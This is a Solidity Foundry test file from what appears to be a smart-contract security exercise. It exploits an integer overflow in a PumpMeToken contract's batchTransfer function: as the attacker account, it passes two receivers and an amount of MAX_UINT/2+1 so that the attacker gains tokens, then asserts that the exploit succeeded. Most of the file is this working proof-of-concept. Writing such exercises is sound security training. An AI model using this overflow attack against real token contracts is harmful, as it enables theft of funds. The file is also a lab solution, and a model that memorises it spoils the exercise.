//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/arithmetic-overflows-4/PumpMeToken.sol";

/**
@dev run "forge test --match-contract AO2" 
*/
contract TestAO4 is Test {
    PumpMeToken token;

    uint256 constant MAX_UINT = (2 ** 256 - 1);
    uint public constant INITIAL_SUPPLY = 1000000 ether;

    address deployer;
    address attacker;

    uint256 attackerBalance;
    uint256 deployerBalance;

    function setUp() public {
        deployer = address(1);
        attacker = address(2);

        vm.prank(deployer);
        token = new PumpMeToken(INITIAL_SUPPLY);

        attackerBalance = token.balanceOf(attacker);
        deployerBalance = token.balanceOf(deployer);

        assertEq(attackerBalance, 0);
        assertEq(deployerBalance, INITIAL_SUPPLY);
    }

    function test() public {
        console.log("[+]Exploiting...");

        vm.startPrank(attacker);

        uint256 amount = MAX_UINT / 2 + 1;

        address[] memory receivers = new address[](2);
        receivers[0] = attacker;
        receivers[1] = deployer;

        token.batchTransfer(receivers, amount);
        vm.stopPrank();

        // Attacker should have a lot of tokens (at least more than 1 million)
        assertEq(token.balanceOf(attacker) > attackerBalance, true);

        console.log("Exploit Successful");
    }
}
